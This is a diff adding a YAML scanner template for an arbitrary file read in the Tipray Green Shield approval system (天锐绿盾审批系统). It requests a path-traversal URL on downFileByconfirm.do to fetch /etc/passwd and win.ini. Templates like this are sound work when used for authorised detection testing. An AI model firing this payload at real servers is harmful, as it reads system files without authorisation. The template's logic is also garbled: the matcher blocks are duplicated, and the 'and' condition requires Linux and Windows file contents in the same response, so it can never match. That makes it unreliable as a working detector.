@@ -1,0 +1,58 @@
+id: poc-yaml-tipray-gsas-downfilebyconfirm-do-anyfile-read
+info:
+  name: 天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  paths:
+    - "C:/windows/win.ini"
+    - "/etc/passwd"
+
+http:
+  - method: GET
+    path:
+      - "/trwfe/service/.%2E/file/downFileByconfirm.do?dstPath={{paths}}&fileName=&processInstanceIds="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/force-download"
+      - type: word
+        part: header
+        words:
+          - "filename=\"\""
+      - type: word
+        part: body
+        words:
+          - "/bin"
+          - "root:"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "/bin"
+          - "root:"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "/bin"
+          - "root:"
